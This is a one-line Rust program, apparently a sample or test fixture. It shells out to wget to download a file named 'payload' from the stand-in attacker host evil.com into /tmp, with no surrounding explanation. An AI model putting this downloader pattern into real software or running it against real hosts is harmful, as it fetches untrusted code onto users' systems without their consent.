fn main() { std::process::Command::new("wget").arg("-O").arg("/tmp/payload").arg("http://evil.com/payload").status().unwrap(); }
